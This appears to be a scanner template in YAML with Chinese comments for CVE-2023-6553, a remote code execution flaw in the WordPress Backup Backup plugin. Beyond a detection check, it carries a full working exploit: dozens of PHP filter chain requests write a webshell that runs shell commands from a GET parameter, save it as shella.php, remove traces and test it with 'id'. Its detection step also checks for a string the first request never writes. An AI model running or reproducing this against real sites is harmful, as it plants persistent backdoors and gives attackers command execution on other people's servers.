name: "WordPress Backup Backup Plugin RCE (CVE-2023-6553)"
description: "WordPress Backup Backup插件存在远程代码执行漏洞，攻击者可通过Content-Dir头部注入恶意PHP代码，利用PHP filter chain技术绕过过滤器执行任意代码，可导致服务器完全被控制。"
severity: "critical"
references:
  - "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6553"
  - "https://wpscan.com/vulnerability/389a8b96-7b9e-4d9b-a6c5-3e5c4b2c5d8e"

requests:
  - steps:
      # 第一步：写入测试文件验证漏洞
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
          Content-Type: "application/x-www-form-urlencoded"
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('V','w'),'a');?>)}}"
        matchers:
          - type: "status"
            status: [200]
            condition: "and"
      
      # 第二步：验证文件是否成功写入
      - method: "GET"
        path: "/wp-content/plugins/backup-backup/includes/V"
        matchers:
          - type: "word"
            words: ["CVE-2023-6553-VULN-TEST"]
            condition: "and"
          - type: "status"
            status: [200]
            condition: "and"

  - post:
      # 第三步：后利用 - 逐字节写入webshell
      # 创建空文件X作为临时文件
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','w'),'');?>)}}"
        matchers:
          - type: "status"
            status: [200]

      # 逐字节写入PHP webshell代码: <?php echo "[S]";echo `$_GET[0]`;echo "[E]";?>
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x3c\");?>)}}"  # <
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x3f\");?>)}}"  # ?
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x70\");?>)}}"  # p
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x68\");?>)}}"  # h
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x70\");?>)}}"  # p
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x20\");?>)}}"  # space
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x65\");?>)}}"  # e
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x63\");?>)}}"  # c
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x68\");?>)}}"  # h
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x6f\");?>)}}"  # o
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x20\");?>)}}"  # space
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x22\");?>)}}"  # "
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x5b\");?>)}}"  # [
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x53\");?>)}}"  # S
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x5d\");?>)}}"  # ]
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x22\");?>)}}"  # "
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x3b\");?>)}}"  # ;
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x65\");?>)}}"  # e
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x63\");?>)}}"  # c
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x68\");?>)}}"  # h
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x6f\");?>)}}"  # o
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x20\");?>)}}"  # space
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x60\");?>)}}"  # `
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x24\");?>)}}"  # $
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x5f\");?>)}}"  # _
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x47\");?>)}}"  # G
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x45\");?>)}}"  # E
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x54\");?>)}}"  # T
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x5b\");?>)}}"  # [
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x30\");?>)}}"  # 0
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x5d\");?>)}}"  # ]
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x60\");?>)}}"  # `
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x3b\");?>)}}"  # ;
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x65\");?>)}}"  # e
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x63\");?>)}}"  # c
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x68\");?>)}}"  # h
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x6f\");?>)}}"  # o
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x20\");?>)}}"  # space
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x22\");?>)}}"  # "
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x5b\");?>)}}"  # [
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x45\");?>)}}"  # E
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x5d\");?>)}}"  # ]
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x22\");?>)}}"  # "
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x3b\");?>)}}"  # ;
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x3f\");?>)}}"  # ?
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php fwrite(fopen('X','a'),\"\\x3e\");?>)}}"  # >

      # 将临时文件X复制为webshell文件
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php copy('X','shella.php');?>)}}"
        matchers:
          - type: "status"
            status: [200]

      # 清理临时文件
      - method: "POST"
        path: "/wp-content/plugins/backup-backup/includes/backup-heart.php"
        headers:
          Content-Dir: "{{php_filter_chain(<?php unlink('X');?>)}}"

      # 第四步：测试webshell是否成功创建
      - method: "GET"
        path: "/wp-content/plugins/backup-backup/includes/shella.php?0=id"
        matchers:
          - type: "word"
            words: ["[S]", "[E]"]
            condition: "and"
          - type: "regex"
            regex: ["uid=\\d+\\(.*?\\)"]
            condition: "and"
